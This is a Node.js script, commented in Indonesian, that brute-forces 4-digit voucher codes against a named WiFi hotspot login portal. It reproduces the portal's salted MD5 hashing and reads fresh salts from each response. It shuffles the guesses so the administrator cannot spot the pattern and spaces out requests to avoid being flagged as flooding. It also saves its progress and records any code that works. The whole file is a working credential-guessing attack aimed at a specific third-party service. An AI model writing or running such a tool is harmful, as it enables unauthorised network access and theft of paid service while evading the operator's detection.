const axios = require('axios');
const fs = require('fs');

class GuardianBrute {
    constructor() {
        this.targetUrl = "http://hs.shinthink.net/login";
        this.saveFile = 'progress.json'; // Menyimpan urutan terakhir
        this.foundFile = 'VOUCHER_KETEMU.txt'; // Hasil akhir
        
        this.currentSalt1 = "";
        this.currentSalt2 = "";
        this.sessionCookie = "";
        this.allCodes = [];
    }

    // --- FUNGSI MD5 ASLI (PAUL JOHNSTON) ---
    _safe_add(x, y) { var lsw = (x & 0xFFFF) + (y & 0xFFFF); var msw = (x >> 16) + (y >> 16) + (lsw >> 16); return (msw << 16) | (lsw & 0xFFFF); }
    _rol(num, cnt) { return (num << cnt) | (num >>> (32 - cnt)); }
    _cmn(q, a, b, x, s, t) { return this._safe_add(this._rol(this._safe_add(this._safe_add(a, q), this._safe_add(x, t)), s), b); }
    _ff(a, b, c, d, x, s, t) { return this._cmn((b & c) | ((~b) & d), a, b, x, s, t); }
    _gg(a, b, c, d, x, s, t) { return this._cmn((b & d) | (c & (~d)), a, b, x, s, t); }
    _hh(a, b, c, d, x, s, t) { return this._cmn(b ^ c ^ d, a, b, x, s, t); }
    _ii(a, b, c, d, x, s, t) { return this._cmn(c ^ (b | (~d)), a, b, x, s, t); }
    _coreMD5(x) {
        var a = 1732584193, b = -271733879, c = -1732584194, d = 271733878;
        for (var i = 0; i < x.length; i += 16) {
            var olda = a, oldb = b, oldc = c, oldd = d;
            a = this._ff(a, b, c, d, x[i+0], 7, -680876936); d = this._ff(d, a, b, c, x[i+1], 12, -389564586);
            c = this._ff(c, d, a, b, x[i+2], 17, 606105819); b = this._ff(b, c, d, a, x[i+3], 22, -1044525330);
            a = this._ff(a, b, c, d, x[i+4], 7, -176418897); d = this._ff(d, a, b, c, x[i+5], 12, 1200080426);
            c = this._ff(c, d, a, b, x[i+6], 17, -1473231341); b = this._ff(b, c, d, a, x[i+7], 22, -45705983);
            a = this._ff(a, b, c, d, x[i+8], 7, 1770035416); d = this._ff(d, a, b, c, x[i+9], 12, -1958414417);
            c = this._ff(c, d, a, b, x[i+10], 17, -42063); b = this._ff(b, c, d, a, x[i+11], 22, -1990404162);
            a = this._ff(a, b, c, d, x[i+12], 7, 1804603682); d = this._ff(d, a, b, c, x[i+13], 12, -40341101);
            c = this._ff(c, d, a, b, x[i+14], 17, -1502002290); b = this._ff(b, c, d, a, x[i+15], 22, 1236535329);
            a = this._gg(a, b, c, d, x[i+1], 5, -165796510); d = this._gg(d, a, b, c, x[i+6], 9, -1069501632);
            c = this._gg(c, d, a, b, x[i+11], 14, 643717713); b = this._gg(b, c, d, a, x[i+0], 20, -373897302);
            a = this._gg(a, b, c, d, x[i+5], 5, -701558691); d = this._gg(d, a, b, c, x[i+10], 9, 38016083);
            c = this._gg(c, d, a, b, x[i+15], 14, -660478335); b = this._gg(b, c, d, a, x[i+4], 20, -405537848);
            a = this._gg(a, b, c, d, x[i+9], 5, 568446438); d = this._gg(d, a, b, c, x[i+14], 9, -1019803690);
            c = this._gg(c, d, a, b, x[i+3], 14, -187363961); b = this._gg(b, c, d, a, x[i+8], 20, 1163531501);
            a = this._gg(a, b, c, d, x[i+13], 5, -1444681467); d = this._gg(d, a, b, c, x[i+2], 9, -51403784);
            c = this._gg(c, d, a, b, x[i+7], 14, 1735328473); b = this._gg(b, c, d, a, x[i+12], 20, -1926607734);
            a = this._hh(a, b, c, d, x[i+5], 4, -378558); d = this._hh(d, a, b, c, x[i+8], 11, -2022574463);
            c = this._hh(c, d, a, b, x[i+11], 16, 1839030562); b = this._hh(b, c, d, a, x[i+14], 23, -35309556);
            a = this._hh(a, b, c, d, x[i+1], 4, -1530992060); d = this._hh(d, a, b, c, x[i+4], 11, 1272893353);
            c = this._hh(c, d, a, b, x[i+7], 16, -155497632); b = this._hh(b, c, d, a, x[i+10], 23, -1094730640);
            a = this._hh(a, b, c, d, x[i+13], 4, 681279174); d = this._hh(d, a, b, c, x[i+0], 11, -358537222);
            c = this._hh(c, d, a, b, x[i+3], 16, -722521979); b = this._hh(b, c, d, a, x[i+6], 23, 76029189);
            a = this._hh(a, b, c, d, x[i+9], 4, -640364487); d = this._hh(d, a, b, c, x[i+12], 11, -421815835);
            c = this._hh(c, d, a, b, x[i+15], 16, 530742520); b = this._hh(b, c, d, a, x[i+2], 23, -995338651);
            a = this._ii(a, b, c, d, x[i+0], 6, -198630844); d = this._ii(d, a, b, c, x[i+7], 10, 1126891415);
            c = this._ii(c, d, a, b, x[i+14], 15, -1416354905); b = this._ii(b, c, d, a, x[i+5], 21, -57434055);
            a = this._ii(a, b, c, d, x[i+12], 6, 1700485571); d = this._ii(d, a, b, c, x[i+3], 10, -1894986606);
            c = this._ii(c, d, a, b, x[i+10], 15, -1051523); b = this._ii(b, c, d, a, x[i+1], 21, -2054922799);
            a = this._ii(a, b, c, d, x[i+8], 6, 1873313359); d = this._ii(d, a, b, c, x[i+15], 10, -30611744);
            c = this._ii(c, d, a, b, x[i+6], 15, -1560198380); b = this._ii(b, c, d, a, x[i+13], 21, 1309151649);
            a = this._ii(a, b, c, d, x[i+4], 6, -145523070); d = this._ii(d, a, b, c, x[i+11], 10, -1120210379);
            c = this._ii(c, d, a, b, x[i+2], 15, 718787259); b = this._ii(b, c, d, a, x[i+9], 21, -343485551);
            a = this._safe_add(a, olda); b = this._safe_add(b, oldb); c = this._safe_add(c, oldc); d = this._safe_add(d, oldd);
        }
        return [a, b, c, d];
    }
    _binl2hex(binarray) { var hex_tab = "0123456789abcdef", str = ""; for (var i = 0; i < binarray.length * 4; i++) { str += hex_tab.charAt((binarray[i>>2] >> ((i%4)*8+4)) & 0xF) + hex_tab.charAt((binarray[i>>2] >> ((i%4)*8)) & 0xF); } return str; }
    _str2binl(str) { var nblk = ((str.length + 8) >> 6) + 1, blks = new Array(nblk * 16); for (var i = 0; i < nblk * 16; i++) blks[i] = 0; for (var i = 0; i < str.length; i++) blks[i>>2] |= (str.charCodeAt(i) & 0xFF) << ((i%4) * 8); blks[i>>2] |= 0x80 << ((i%4) * 8); blks[nblk*16-2] = str.length * 8; return blks; }
    hexMD5(str) { return this._binl2hex(this._coreMD5(this._str2binl(str))); }

    // --- UTILS ---
    decodeOctal(str) { return str.replace(/\\([0-7]{1,3})/g, (m, oct) => String.fromCharCode(parseInt(oct, 8))); }

    extractSalt(html) {
        const regex = /hexMD5\('([^']+)' \+ [^+]+ \+ '([^']+)'\)/;
        const match = html.match(regex);
        if (match) {
            this.currentSalt1 = this.decodeOctal(match[1]);
            this.currentSalt2 = this.decodeOctal(match[2]);
            return true;
        }
        return false;
    }

    // Generator 4-digit cerdas
    generateSmartCodes() {
        const res = [];
        const bt = (curr, frq) => {
            if (curr.length === 4) { res.push(curr.join("")); return; }
            for (let d = 0; d <= 9; d++) {
                if (curr.length === 0 && d === 0) continue;
                if ((frq[d] || 0) >= 2) continue;
                if (curr.length >= 2) {
                    const a = curr[curr.length - 2], b = curr[curr.length - 1];
                    if ((b === a + 1 && d === b + 1) || (b === a - 1 && d === b - 1)) continue;
                }
                curr.push(d); frq[d] = (frq[d] || 0) + 1;
                bt(curr, frq);
                curr.pop(); frq[d]--;
            }
        };
        bt([], {});
        // Shuffle agar urutan tidak ketebak admin
        for (let i = res.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [res[i], res[j]] = [res[j], res[i]];
        }
        return res;
    }

    // --- MAIN ENGINE ---
    async start() {
        console.log("\x1b[36m%s\x1b[0m", "🛡️  GUARDIAN v7.0 - RESILIENT MODE");

        // 1. Load data lama jika ada
        let startIndex = 0;
        if (fs.existsSync(this.saveFile)) {
            const save = JSON.parse(fs.readFileSync(this.saveFile));
            this.allCodes = save.codes;
            startIndex = save.lastIndex + 1;
            console.log(`♻️ Melanjutkan dari posisi: ${startIndex}`);
        } else {
            this.allCodes = this.generateSmartCodes();
            console.log(`📦 Menghasilkan ${this.allCodes.length} kombinasi baru.`);
        }

        // 2. Ambil Salt awal
        try {
            const initial = await axios.post(this.targetUrl, "username=ping&password=ping", {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                validateStatus: null 
            });
            this.sessionCookie = initial.headers['set-cookie'];
            this.extractSalt(initial.data);
            console.log("📡 Koneksi Stabil. Salt Diterima.");
        } catch (e) {
            return console.error("❌ Gateway tidak ditemukan. Cek koneksi WiFi!");
        }

        // 3. Loop Eksekusi
        for (let i = startIndex; i < this.allCodes.length; i++) {
            const voucher = this.allCodes[i];
            const hash = this.hexMD5(this.currentSalt1 + voucher + this.currentSalt2);

            try {
                const res = await axios.post(this.targetUrl, new URLSearchParams({
                    'username': voucher,
                    'password': hash,
                    'dst': 'http://www.msftconnecttest.com/redirect',
                    'popup' : 'true'
                }).toString(), {
                    headers: { 
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Cookie': this.sessionCookie ? this.sessionCookie.join('; ') : '' 
                    },
                    maxRedirects: 0,
                    validateStatus: null,
                    timeout: 5000
                });

                // Jika Ketemu (Status 302 Redirect)
                if (res.status === 302 || res.headers.location?.includes('status')) {
                    process.stdout.write('\u0007'); // BIP!
                    console.log(`\n\x1b[42m\x1b[30m 🏆 KETEMU: ${voucher} \x1b[0m`);
                    fs.appendFileSync(this.foundFile, `Voucher: ${voucher} (Ditemukan: ${new Date().toLocaleString()})\n`);
                    
                    // Berhenti & Hapus progress karena sudah sukses
                    if (fs.existsSync(this.saveFile)) fs.unlinkSync(this.saveFile);
                    return;
                }

                // Update Salt dari respon terakhir
                this.extractSalt(res.data);
                
                // Simpan Progress ke File (Setiap 1 percobaan)
                fs.writeFileSync(this.saveFile, JSON.stringify({ lastIndex: i, codes: this.allCodes }));

                process.stdout.write(`\r[${i}/${this.allCodes.length}] Mencoba: ${voucher} | Salt: Updated`);

                // Jeda agar tidak dianggap flooding (2.5 - 4 detik)
                await new Promise(r => setTimeout(r, 2500 + Math.random() * 1500));

            } catch (err) {
                console.log(`\n⚠️ Sinyal Drop pada ${voucher}. Menunggu 10 detik...`);
                await new Promise(r => setTimeout(r, 100));
                i--; // Ulangi index yang sama
            }
        }
    }
}

new GuardianBrute().start();